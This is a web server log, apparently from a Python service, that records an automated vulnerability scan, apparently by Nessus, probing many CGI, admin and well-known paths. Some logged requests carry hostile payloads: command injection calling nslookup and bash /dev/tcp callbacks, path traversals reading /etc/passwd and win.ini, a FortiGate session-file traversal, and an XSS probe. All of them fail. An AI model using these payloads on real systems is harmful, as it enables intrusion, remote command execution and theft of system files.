[Gloo] Rank [Gloo] Rank 01 is connected to  is connected to 11 peer ranks.  peer ranks. Expected number of connected peer ranks is : Expected number of connected peer ranks is : 11

[Gloo] Rank 1 is connected to 1 peer ranks. Expected number of connected peer ranks is : 1
[Gloo] Rank 0 is connected to 1 peer ranks. Expected number of connected peer ranks is : 1
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[Gloo] Rank 0 is connected to 0 peer ranks. Expected number of connected peer ranks is : 0
[2026-05-28 01:16:43] INFO:     10.127.66.203:56492 - "GET /.well-known/jwks.json HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56496 - "GET /jwks.json HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56512 - "GET /.well-known/jwks HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56516 - "GET /api/.well-known/jwks.json HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56528 - "GET /auth/.well-known/jwks.json HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56538 - "GET /oauth/.well-known/jwks.json HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56552 - "GET /oauth2/.well-known/jwks.json HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56566 - "GET /.well-known/oauth/jwks.json HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56576 - "GET /v1/.well-known/jwks.json HTTP/1.1" 404 Not Found
[2026-05-28 01:16:43] INFO:     10.127.66.203:56580 - "GET /xsql/demo/airport/airport.xsql?xml-stylesheet=none HTTP/1.1" 404 Not Found
[2026-05-28 01:16:48] INFO:     10.127.66.203:44186 - "POST /OA_HTML/configurator/UiServlet HTTP/1.1" 404 Not Found
[2026-05-28 01:16:52] INFO:     10.127.66.203:44194 - "GET /OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id| HTTP/1.1" 404 Not Found
[2026-05-28 01:16:52] INFO:     10.127.66.203:44206 - "GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1" 404 Not Found
[2026-05-28 01:16:52] INFO:     10.127.66.203:44208 - "GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1" 404 Not Found
[2026-05-28 01:17:02] INFO:     10.127.66.203:36070 - "GET /api/getServices?name[]=$(/bin/bash%20-c%20%22nslookup%20log4shell-generic-z1V99DiLyCGgmf89VnhGten.w.nessus.org) HTTP/1.1" 404 Not Found
[2026-05-28 01:17:07] INFO:     10.127.66.203:37450 - "GET /api/getServices?name[]=$(bash%20-c%20%22echo%20exploited_port[31877]by_nessus%20%3E/dev/tcp/10.127.66.203/33783") HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:39932 - "GET /././.. HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:39948 - "GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../ HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:39958 - "GET /1779902175-mongoose_trailing_slash_disclosure.nasl HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:39962 - "GET /version HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:39968 - "GET /.%252e/.%252e/.%252e/.%252e/windows/win.ini HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:39978 - "GET /.%252e/.%252e/.%252e/.%252e/winnt/win.ini HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:39988 - "GET /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:39996 - "GET /search?NS-query-pat=..\..\..\..\..\..\..\..\winnt\win.ini HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40006 - "GET /search?NS-query-pat=../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40010 - "GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40016 - "GET /status.xsl. HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40024 - "GET /Gd9exv74dLMP HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40038 - "PUT /Gd9exv74dLMP HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40044 - "GET /Gd9exv74dLMP HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40056 - "POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40064 - "POST /glpi/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40076 - "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40080 - "POST /FormHandler.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40084 - "GET /cgi-bin/faqmanager.cgi?toc=/etc/passwd%00 HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40090 - "POST http%3A//127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40106 - "GET /DB4Web/a1psvasapp01%3A23/foo HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40122 - "GET /WebInterface/ HTTP/1.1" 404 Not Found
[2026-05-28 01:17:19] INFO:     10.127.66.203:40130 - "GET /WebInterface HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40146 - "GET /CFIDE/administrator/index.cfm HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40152 - "GET /backend/settings/oauth_adfs?hostname=10.127.128.85 HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40154 - "GET /cwhp/XmpFileDownloadServlet?parameterName=downloadDoc&downloadDirectory=..\..\..\Windows\System32\drivers\etc\&readmeText=1 HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40160 - "GET /dev/ HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40174 - "GET /gui/ HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40188 - "GET /gui/ HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40196 - "GET /axis/DirectDownload.jsp HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40208 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:17:20] INFO:     10.127.66.203:40208 - "GET /_mt/mt.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40220 - "GET /admin.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40226 - "GET /administrator.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40236 - "GET /buglist.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40240 - "GET /cgi/mid.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40244 - "GET /cgi-bin/admin HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40252 - "GET /cgi-bin/admin.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40268 - "GET /cgi-bin/admin.pl HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40284 - "GET /cgi-bin/administrator HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40300 - "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40302 - "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40306 - "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40320 - "GET /cgi-bin/cart.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40328 - "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40344 - "GET /cgi-bin/count.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40346 - "GET /cgi-bin/Count.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40358 - "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40372 - "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40374 - "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40378 - "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40390 - "GET /cgi-bin/help.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40404 - "GET /cgi-bin/hi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40412 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40418 - "GET /cgi-bin/index.pl HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40428 - "GET /cgi-bin/index.sh HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40442 - "GET /cgi-bin/login HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40448 - "GET /cgi-bin/login.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40460 - "GET /cgi-bin/mailit.pl HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40468 - "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40480 - "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40492 - "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40494 - "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40508 - "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40514 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40522 - "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40534 - "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40548 - "GET /cgi-bin/search HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40560 - "GET /cgi-bin/search.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40568 - "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40578 - "GET /cgi-bin/status HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40582 - "GET /cgi-bin/status.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40584 - "GET /cgi-bin/test.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40590 - "GET /cgi-bin/test.sh HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40604 - "GET /cgi-bin/test-cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40612 - "GET /cgi-bin/upload.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40626 - "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40638 - "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40646 - "GET /cgi-bin/wa HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40662 - "GET /cgi-bin/wa.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40672 - "GET /cgi-bin/wa.exe HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40682 - "GET /cgi-bin/whois.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40690 - "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40700 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40706 - "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40718 - "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40732 - "GET /index.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40746 - "GET /index.pl HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40760 - "GET /index.sh HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40768 - "GET /nph-mr.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40774 - "GET /query.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40784 - "GET /session_login.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40786 - "GET /show_bug.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40794 - "GET /test HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40804 - "GET /test.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40810 - "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40820 - "GET /whois.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40826 - "GET /wp-login.php HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40840 - "GET /wwwadmin.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40844 - "GET /wwwboard.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40854 - "GET /xampp/cgi.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40870 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:17:20] INFO:     10.127.66.203:40870 - "GET /_mt/mt.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40872 - "GET /admin.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40880 - "GET /administrator.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40888 - "GET /buglist.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40900 - "POST /cgi-bin/file_transfer.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40908 - "GET /cgi/mid.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40914 - "GET /cgi-bin/admin HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40924 - "GET /cgi-bin/admin.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40938 - "GET /cgi-bin/admin.pl HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40948 - "GET /cgi-bin/administrator HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40964 - "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40978 - "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:40992 - "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41004 - "GET /cgi-bin/cart.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41018 - "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41030 - "GET /logon?onok=%22%3e%3cscript%3ealert%28%27axon_logon_xss.nasl%27%29%3c%2fscript%3e HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41044 - "GET /cgi-bin/count.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41058 - "GET /cgi-bin/Count.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41074 - "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41088 - "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41092 - "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41100 - "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41110 - "GET /cgi-bin/help.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41120 - "GET /error_page.htm HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41134 - "GET /cgi-bin/hi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41150 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41160 - "GET /cgi-bin/index.pl HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41166 - "GET /cgi-bin/index.sh HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41176 - "GET /cgi-bin/login.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41178 - "GET /cgi-bin/mailit.pl HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41194 - "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41198 - "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41206 - "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41210 - "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41222 - "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41234 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41242 - "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41256 - "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41262 - "GET /cgi-bin/search HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41274 - "GET /cgi-bin/search.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41288 - "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41298 - "GET /cgi-bin/status HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41310 - "GET /cgi-bin/status.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41322 - "GET /cgi-bin/test.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41324 - "GET /cgi-bin/test.sh HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41326 - "GET /cgi-bin/test-cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41328 - "GET /cgi-bin/upload.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41334 - "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41344 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:17:20] INFO:     10.127.66.203:41358 - "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41362 - "GET /cgi-bin/wa HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41366 - "GET /cgi-bin/wa.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41372 - "GET /cgi-bin/wa.exe HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41376 - "GET /cgi-bin/whois.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41390 - "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41406 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41420 - "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41422 - "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41432 - "GET /index.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41442 - "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41446 - "GET /index.pl HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41458 - "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41474 - "GET /index.sh HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41478 - "GET /nph-mr.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41486 - "GET /query.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41494 - "GET /session_login.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41504 - "GET /show_bug.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41512 - "GET /test HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41526 - "GET /test.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41538 - "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41546 - "GET /whois.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41554 - "GET /wp-login.php HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41560 - "GET /wwwadmin.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41564 - "GET /wwwboard.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41568 - "GET /xampp/cgi.cgi HTTP/1.1" 404 Not Found
[2026-05-28 01:17:20] INFO:     10.127.66.203:41576 - "GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator HTTP/1.1" 404 Not Found
[2026-05-28 01:17:21] INFO:     10.127.66.203:41586 - "GET /..%5Cpixfir~1%5Chow_to_login.html HTTP/1.1" 404 Not Found
[2026-05-28 01:17:21] INFO:     10.127.66.203:41602 - "GET /trace.axd HTTP/1.1" 404 Not Found
[2026-05-28 01:17:21] INFO:     10.127.66.203:41606 - "GET /global.asa HTTP/1.1" 404 Not Found
[2026-05-28 01:17:21] INFO:     10.127.66.203:41614 - "GET /index.jsp%00x HTTP/1.1" 404 Not Found
[2026-05-28 01:17:21] INFO:     10.127.66.203:41624 - "GET /user_settings.cfg HTTP/1.1" 404 Not Found
[2026-05-28 01:18:03] INFO:     10.127.66.203:50372 - "GET / HTTP/1.1" 200 OK
[2026-05-28 01:18:03] INFO:     10.127.66.203:50372 - "POST / HTTP/1.1" 405 Method Not Allowed
[2026-05-28 01:18:03] INFO:     10.127.66.203:50376 - "GET /rails_info/properties HTTP/1.1" 404 Not Found
[2026-05-28 01:18:03] INFO:     10.127.66.203:50392 - "GET /index.html HTTP/1.1" 404 Not Found
